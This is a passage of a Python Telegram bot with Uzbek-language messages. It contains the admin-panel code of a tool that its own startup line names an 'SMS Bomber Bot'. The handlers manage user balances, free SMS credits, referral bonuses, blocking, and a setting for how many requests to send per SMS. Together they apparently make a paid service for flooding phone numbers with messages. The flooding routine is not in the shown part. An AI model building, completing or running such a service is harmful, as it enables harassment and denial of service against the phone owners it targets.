@bot.callback_query_handler(func=lambda call: call.data == "toggle_forward")
def toggle_forward(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    settings = load_settings()
    settings['forward_enabled'] = not settings.get('forward_enabled', False)
    save_settings(settings)
    
    status = "yoqildi" if settings['forward_enabled'] else "o'chirildi"
    bot.answer_callback_query(call.id, f"✅ Forward {status}!")
    admin_forward(call)

# Forward xabarni qabul qilish
@bot.message_handler(content_types=['text', 'photo', 'video', 'audio', 'document', 'voice', 'video_note', 'sticker', 'animation'], func=lambda m: m.forward_from_chat is not None or m.forward_from is not None)
def handle_forward(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    settings = load_settings()
    settings['forward_message_id'] = message.message_id
    settings['forward_from_chat'] = message.chat.id
    save_settings(settings)
    
    bot.reply_to(message, "✅ Forward xabar sozlandi!")

# Orqaga qaytish
@bot.callback_query_handler(func=lambda call: call.data == "admin_back")
def admin_back(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    bot.answer_callback_query(call.id)
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Statistika", callback_data="admin_stats"),
        types.InlineKeyboardButton("👥 Foydalanuvchilar", callback_data="admin_users")
    )
    markup.add(
        types.InlineKeyboardButton("⚙️ Sozlamalar", callback_data="admin_settings"),
        types.InlineKeyboardButton("📢 Reklama", callback_data="admin_ads")
    )
    markup.add(
        types.InlineKeyboardButton("📨 Xabar yuborish", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("📋 Kanallar", callback_data="admin_channels")
    )
    markup.add(
        types.InlineKeyboardButton("🔄 Forward", callback_data="admin_forward")
    )
    
    admin_text = "👨‍💼 <b>Admin Panel</b>\n\nKerakli bo'limni tanlang:"
    bot.edit_message_text(admin_text, call.message.chat.id, call.message.message_id,
                         parse_mode='HTML', reply_markup=markup)

# Foydalanuvchi qidirish
@bot.callback_query_handler(func=lambda call: call.data == "admin_users_search")
def admin_users_search(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    bot.answer_callback_query(call.id)
    msg = bot.send_message(ADMIN_ID, "🔍 Foydalanuvchi ID sini kiriting:")
    bot.register_next_step_handler(msg, process_user_search)

def process_user_search(message):
    try:
        user_id = int(message.text)
        user_data = get_user_data(user_id)
        
        user_info = f"""
👤 <b>Foydalanuvchi ma'lumotlari:</b>

🆔 ID: <code>{user_id}</code>
👤 Ism: {user_data.get('first_name', 'N/A')}
👤 Username: @{user_data.get('username', 'N/A')}
💳 Balans: {user_data['balance']} so'm
🆓 Bepul SMS: {user_data['free_sms']} ta
📊 Yuborilgan: {user_data['total_sent']} ta
👥 Referallar: {len(user_data.get('referrals', []))} ta
📅 Ro'yxatdan o'tgan: {user_data.get('registered_at', 'N/A')[:10]}
🚫 Bloklangan: {'Ha' if user_data.get('is_blocked') else "Yo'q"}
"""
        
        markup = types.InlineKeyboardMarkup()
        if user_data.get('is_blocked'):
            markup.add(types.InlineKeyboardButton("✅ Blokdan chiqarish", callback_data=f"unblock_{user_id}"))
        else:
            markup.add(types.InlineKeyboardButton("🚫 Bloklash", callback_data=f"block_{user_id}"))
        markup.add(types.InlineKeyboardButton("💰 Balans qo'shish", callback_data=f"add_balance_{user_id}"))
        
        bot.send_message(ADMIN_ID, user_info, parse_mode='HTML', reply_markup=markup)
    except ValueError:
        bot.send_message(ADMIN_ID, "❌ Noto'g'ri ID format!")
    except:
        bot.send_message(ADMIN_ID, "❌ Foydalanuvchi topilmadi!")

# Foydalanuvchini bloklash
@bot.callback_query_handler(func=lambda call: call.data.startswith('block_'))
def block_user(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    user_id = int(call.data.replace('block_', ''))
    user_data = get_user_data(user_id)
    user_data['is_blocked'] = True
    update_user_data(user_id, user_data)
    
    bot.answer_callback_query(call.id, "✅ Foydalanuvchi bloklandi!")
    try:
        bot.send_message(user_id, "⚠️ Sizning hisobingiz admin tomonidan bloklandi!")
    except:
        pass

# Foydalanuvchini blokdan chiqarish
@bot.callback_query_handler(func=lambda call: call.data.startswith('unblock_'))
def unblock_user(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    user_id = int(call.data.replace('unblock_', ''))
    user_data = get_user_data(user_id)
    user_data['is_blocked'] = False
    update_user_data(user_id, user_data)
    
    bot.answer_callback_query(call.id, "✅ Foydalanuvchi blokdan chiqarildi!")
    try:
        bot.send_message(user_id, "✅ Sizning hisobingiz blokdan chiqarildi!")
    except:
        pass

# So'rovlar sonini o'zgartirish
@bot.callback_query_handler(func=lambda call: call.data == "set_requests")
def set_requests(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    bot.answer_callback_query(call.id)
    msg = bot.send_message(ADMIN_ID, "🔄 Har bir SMS uchun nechta so'rov yuborilsin? (1-10)")
    bot.register_next_step_handler(msg, process_requests_count)

def process_requests_count(message):
    try:
        count = int(message.text)
        if count < 1 or count > 10:
            bot.send_message(ADMIN_ID, "❌ Raqam 1 dan 10 gacha bo'lishi kerak!")
            return
        
        settings = load_settings()
        settings['sms_requests_count'] = count
        save_settings(settings)
        
        bot.send_message(ADMIN_ID, f"✅ So'rovlar soni {count} ga o'zgartirildi!")
    except ValueError:
        bot.send_message(ADMIN_ID, "❌ Noto'g'ri format! Faqat raqam kiriting.")

# Bepul SMS sozlash
@bot.callback_query_handler(func=lambda call: call.data == "set_free_sms")
def set_free_sms(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    bot.answer_callback_query(call.id)
    msg = bot.send_message(ADMIN_ID, "🆓 Yangi foydalanuvchilarga nechta bepul SMS berilsin?")
    bot.register_next_step_handler(msg, process_free_sms)

def process_free_sms(message):
    try:
        count = int(message.text)
        if count < 0:
            bot.send_message(ADMIN_ID, "❌ Raqam 0 dan katta bo'lishi kerak!")
            return
        
        settings = load_settings()
        settings['free_sms_count'] = count
        save_settings(settings)
        
        bot.send_message(ADMIN_ID, f"✅ Bepul SMS soni {count} ga o'zgartirildi!")
    except ValueError:
        bot.send_message(ADMIN_ID, "❌ Noto'g'ri format! Faqat raqam kiriting.")

# Referal bonusini sozlash
@bot.callback_query_handler(func=lambda call: call.data == "set_ref_bonus")
def set_ref_bonus(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    bot.answer_callback_query(call.id)
    msg = bot.send_message(ADMIN_ID, "🎁 Har bir referal uchun qancha bonus berilsin? (so'mda)")
    bot.register_next_step_handler(msg, process_ref_bonus)

def process_ref_bonus(message):
    try:
        bonus = int(message.text)
        if bonus < 0:
            bot.send_message(ADMIN_ID, "❌ Bonus 0 dan katta bo'lishi kerak!")
            return
        
        settings = load_settings()
        settings['referral_bonus'] = bonus
        save_settings(settings)
        
        bot.send_message(ADMIN_ID, f"✅ Referal bonusi {bonus} so'mga o'zgartirildi!")
    except ValueError:
        bot.send_message(ADMIN_ID, "❌ Noto'g'ri format! Faqat raqam kiriting.")

print("🤖 Bot ishga tushdi...")
print("📊 Barcha funksiyalar faol!")
print("✅ SMS Bomber Bot - Mukammal versiya")
bot.polling(none_stop=True)
